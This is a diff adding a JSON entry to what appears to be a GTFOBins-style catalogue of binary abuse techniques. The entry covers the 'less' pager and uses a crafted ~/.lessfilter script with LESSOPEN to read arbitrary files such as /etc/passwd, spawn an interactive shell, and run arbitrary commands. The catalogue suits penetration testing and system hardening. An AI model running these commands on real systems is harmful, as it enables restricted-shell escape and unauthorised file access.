@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "description": "This can read arbitrary files by creating a custom lessfilter script.\n",
+        "code": "echo '#!/bin/bash\ncat \"$1\"\nexit 0' > ~/.lessfilter\nchmod +x ~/.lessfilter\nexport LESSOPEN=\"|~/.lessfilter %s\"\nless /etc/passwd\n"
+      }
+    ],
+    "shell": [
+      {
+        "description": "This can spawn an interactive shell by executing commands through lessfilter.\n",
+        "code": "echo '#!/bin/bash\n/bin/bash\nexit 0' > ~/.lessfilter\nchmod +x ~/.lessfilter\nexport LESSOPEN=\"|~/.lessfilter %s\"\nless anyfile\n"
+      }
+    ],
+    "command": [
+      {
+        "description": "This executes arbitrary commands through the lessfilter mechanism.\n",
+        "code": "echo '#!/bin/bash\nCOMMAND\nexit 0' > ~/.lessfilter\nchmod +x ~/.lessfilter\nexport LESSOPEN=\"|~/.lessfilter %s\"\nless anyfile\n"
+      }
+    ]
+  }
+}
